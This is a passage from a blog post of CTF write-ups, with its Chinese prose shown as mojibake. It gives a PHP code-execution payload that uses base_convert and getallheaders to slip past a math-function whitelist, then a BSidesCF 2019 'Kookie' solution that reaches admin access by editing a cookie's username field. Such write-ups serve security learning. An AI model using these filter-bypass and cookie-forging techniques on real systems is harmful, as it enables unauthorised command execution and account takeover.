<p>åé¢å°±å¾ˆå¥½ç†è§£äº†ï¼Œå®ƒä¼šç›´æ¥<code>eval</code>è¿‡æ»¤åçš„<code>c</code>ã€‚æ‰§è¡Œå<code>c</code>&#x3D;<code>$pi</code>&#x3D;<code>_GET</code>ï¼Œ<code>$$pi</code>&#x3D;<code>$_GET</code>ã€‚å†åˆ©ç”¨$_GET{0}($_GET{1})å»æ‰§è¡Œå‡½æ•°å°±å¥½ã€‚å³ä½¿<code>[]</code>è¢«è¿‡æ»¤äº†ä»å¯ä»¥ä½¿ç”¨<code>&#123;&#125;</code>ç»•è¿‡ã€‚æ„é€ å®Œ<code>_GET</code>åè¿˜éœ€è¦å¼•å…¥ä¸€ä¸ªå˜é‡æ¥ä½œä¸ºå‡½æ•°æ‰§è¡Œ, ä¾‹å¦‚ <code>$a()</code>, æˆ‘ä»¬ç”¨ <code>$pi</code> ä»¥ç»•è¿‡ç™½åå•çš„æ£€æµ‹ã€‚</p>
<h4 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h4><p>åˆ©ç”¨<code>getallheaders</code>å»è§£é¢˜ï¼š</p>
<p><code>payload:/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code>æ³¨æ„è¿™ä¸ª<code>getallheadersçš„ç”¨æ³•</code></p>
<p>é¦–å…ˆä¸ºä»€ä¹ˆæ˜¯30è¿›åˆ¶(å‚è€ƒäº†<code>bfengj</code>å¸ˆå‚…çš„æ–‡ç« )ï¼š</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Warning<br>ç”±äºä½¿ç”¨å†…éƒ¨çš„ â€œdoubleâ€ æˆ– â€œ<span class="hljs-attribute">float</span>â€ ç±»å‹ï¼Œ<span class="hljs-built_in">base_convert</span>() çš„æ“ä½œå¯èƒ½ä¼šå¯¼è‡´å¤§æ•°å€¼ä¸­çš„ç²¾åº¦ä¸¢å¤±ã€‚è¯·å‚è§æœ¬æ‰‹å†Œçš„ æµ®ç‚¹æ•° ç« èŠ‚ä»¥ä¾¿è·å¾—æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚<br><br>ç»è¿‡å¤§å¸ˆçˆ¶ä»¬çš„æµ‹è¯•ï¼Œ<span class="hljs-number">31</span>-<span class="hljs-number">36</span>è¿›åˆ¶çš„getallheaderséƒ½ä¼šå‡ºç°ç²¾åº¦ä¸¢å¤±å¯¼è‡´ä¸èƒ½æˆåŠŸå¾—åˆ°getallheadersï¼Œ<span class="hljs-number">30</span>è¿›åˆ¶çš„æ—¶å€™å°±å¯ä»¥äº†ã€‚<br></code></pre></td></tr></table></figure>

<p><code>system(getallheaders()&#123;1&#125;)</code>ï¼Œè¿™ä¸ª<code>&#123;1&#125;</code>åº”è¯¥æ˜¯è·å–åŒ…å¤´ä¸º<code>1</code>éƒ¨åˆ†çš„å€¼ï¼Œæˆ‘è¯´<code>åº”è¯¥</code>æ˜¯å› ä¸ºæ²¡æ‰¾åˆ°ç›¸å…³æ–‡ç« è¯´è¿™ä¸ªä¸œè¥¿ã€‚ã€‚å¤§å¤šç›´æ¥ç»™äº†<code>payload</code>(ä¼°è®¡å¸ˆå‚…ä»¬è§‰å¾—è¿™é—®é¢˜æ²¡å¿…è¦è¯´ï¼Œå“ˆå“ˆ)ã€‚æˆ‘è‡ªå·±å°è¯•æŠŠ<code>1</code>æ”¹æˆåˆ«çš„å†æ”¹å¯¹åº”åŒ…å¤´ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤(æˆ‘è¿™é‡Œæ”¹æˆäº†<code>333</code>)ï¼š</p>
<p><img src="/img/lovemath1.png" srcset="/img/loading.gif" lazyload alt="lovemath1"></p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/img/kookie1.png" srcset="/img/loading.gif" lazyload alt="kookie1"></p>
<p>è®©æˆ‘ä»¬ä»¥<code>admin</code>çš„èº«ä»½ç™»å½•ï¼Œç„¶åæç¤ºå·²ç»æœ‰<code>cookie/monster</code>è¿™ä¸¤ä¸ªè´¦æˆ·äº†ï¼Œé€‰<code>cookie</code>è¿™ä¸ªç”¨æˆ·åå†éšä¾¿è¾“ä¸ªå¯†ç ç™»å½•ä¸€ä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="/img/kookie2.png" srcset="/img/loading.gif" lazyload alt="kookie2"></p>
<p>å¯ä»¥çœ‹åˆ°è¡Œä¸º&#x2F;ç”¨æˆ·å&#x2F;å¯†ç éƒ½æ˜¯ç›´æ¥ä»¥<code>GET</code>æ–¹å¼ä¼ è¿‡å»çš„(æºç ä¹Ÿæœ‰ç›¸åº”æç¤º)ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æŠŠ<code>username</code>åé¢çš„ä¸œè¥¿åˆ æ‰çœ‹çœ‹èƒ½å¦ç™»å½•ï¼š</p>
<p><code>/?action=login&amp;username=cookie</code></p>
<p>è¿™ä¸ªç™»ä¸ä¸Šå»ï¼Œæ¢<code>monster</code>è¯•è¯•ï¼š</p>
<p><code>/?action=login&amp;username=monster</code></p>
<p>ç™»å½•æˆåŠŸï¼š</p>
<p><img src="/img/kookie4.png" srcset="/img/loading.gif" lazyload alt="kookie4"></p>
<p>æŠ“åŒ…çœ‹çœ‹<code>cookie</code>:</p>
<p><img src="/img/kookie5.png" srcset="/img/loading.gif" lazyload alt="kookie5"></p>
<p>å‘ç°<code>cookie</code>å­—æ®µä¸­<code>username=monster</code>ï¼Œç›´æ¥æ”¹æˆ<code>admin</code>:</p>
<p><img src="/img/kookie6.png" srcset="/img/loading.gif" lazyload alt="kookie6"></p>
<p>åº”è¯¥æ˜¯æ–°ç”Ÿèµ›çš„é¢˜ç›®</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>BuuCTFåšé¢˜è®°å½•_2</div>
      <div>http://example.com/2023/10/30/BUUCTFåšé¢˜è®°å½•_2/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>notbad3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2023å¹´10æœˆ30æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="åˆè¯†vmæ²™ç®±é€ƒé€¸">
                        <span class="hidden-mobile">åˆè¯†vmæ²™ç®±é€ƒé€¸</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
